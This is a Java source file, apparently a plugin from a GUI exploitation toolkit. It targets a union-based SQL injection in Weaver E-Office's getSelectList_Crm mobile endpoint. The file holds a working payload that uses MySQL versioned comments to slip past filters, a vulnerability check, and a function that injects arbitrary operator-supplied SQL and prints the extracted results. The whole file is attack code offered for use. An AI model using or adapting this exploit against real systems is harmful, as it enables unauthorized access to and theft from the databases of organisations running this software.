package exp.oa.weaveroa.eoffice;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import utils.getIndexOf;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.util.HashMap;

public class weaver_eo_getSelectList_crm_sqli implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {

        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            String data = "cc_parent_id=-999+%2F%2A%2150000union%2A%2F+%2F%2A%2150000select%2A%2F+1%2C123321%23";
            head.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0");
            head.put("Content-Type","application/x-www-form-urlencoded");
            head.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
            Response var = HttpTools.post(url + "/E-mobile/App/Init.php?m=getSelectList_Crm" ,data, head, "utf-8");
            if (var.getCode() == 200 && var.getText().contains("123321")) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ weaver_eo_getSelectList_crm_sqli ]");
                    textArea.appendText("\n sql注入类型为联合注入，CMD处输入sql语法查询");
                    textArea.appendText("\n 示例语法: database()");
                    textArea.appendText("\n");
                });

                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }

    private Boolean attcmd(String url, String sql,TextArea textArea, TextArea textArea_cmd) {
        HashMap<String, String> head = new HashMap<>();
        String data = "cc_parent_id=-999+%2F%2A%2150000union%2A%2F+%2F%2A%2150000select%2A%2F+1%2C"+sql+"%23";
        head.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0");
        head.put("Content-Type","application/x-www-form-urlencoded");
        head.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
        Response var = HttpTools.post(url + "/E-mobile/App/Init.php?m=getSelectList_Crm" ,data, head, "utf-8");
        if (var.getCode() == 200 && var.getText().contains("CC_VALUE")){
            String finalVar = var.getText();
            String var2 = finalVar.substring(finalVar.indexOf("CC_VALUE\":\"")+11,finalVar.indexOf("\"}]"));
            Platform.runLater(() -> {
                textArea.appendText("\n SQL语句: "+sql+" 执行成功");
                textArea_cmd.appendText("\n------------------注入结果----------------\n"+var2);
                textArea.appendText("\n");
            });

            return true;
        }else {
            Platform.runLater(() -> {
                textArea.appendText("\n SQL语句: "+sql+" 执行失败");
            });
            return false;
        }
    }
}
